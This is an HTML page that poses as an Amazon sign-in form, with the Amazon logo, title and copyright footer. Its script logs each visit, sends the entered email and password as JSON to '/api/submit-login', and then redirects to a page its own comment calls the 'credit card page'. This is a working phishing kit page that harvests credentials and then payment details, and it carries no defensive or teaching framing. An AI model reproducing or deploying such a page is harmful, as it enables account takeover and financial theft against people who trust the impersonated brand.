<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Amazon Login</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background:#fff;
    margin:0;
    padding:0;
  }
  .container {
    max-width: 400px;
    margin: 80px auto;
    padding: 20px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
  .logo {
    text-align:center;
    margin-bottom: 20px;
  }
  .logo img {
    width: 120px;
  }
  h1 {
    font-weight: normal;
    margin-bottom: 10px;
  }
  label {
    display:block;
    margin-top: 15px;
    font-weight: bold;
  }
  input[type="email"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-top: 6px;
    box-sizing: border-box;
  }
  button {
    margin-top: 20px;
    width: 100%;
    background-color: #febd69;
    border: none;
    padding: 12px;
    font-size: 16px;
    cursor: pointer;
    border-radius: 3px;
  }
  button:hover {
    background-color: #f3a847;
  }
  .footer {
    margin-top: 20px;
    font-size: 12px;
    color: #555;
    text-align: center;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
  </div>
  <h1>Sign-In</h1>
  <form id="loginForm">
    <label for="email">Email or mobile phone number</label>
    <input type="email" id="email" required autocomplete="off" />
    <label for="password">Password</label>
    <input type="password" id="password" required autocomplete="off" />
    <button type="submit">Continue</button>
  </form>
  <div class="footer">Â© 1996-2025, Amazon.com, Inc. or its affiliates</div>
</div>

<script>
  async function getVisitorInfoAndNotify() {
    try {
      await fetch('/api/log-visit', {method:'POST'});
    } catch {}
  }
  getVisitorInfoAndNotify();

  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!email || !password) return;

    await fetch('/api/submit-login', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({email, password})
    });

    // Redirect to credit card page
    window.location.href = '/card.html';
  });
</script>

</body>
</html>
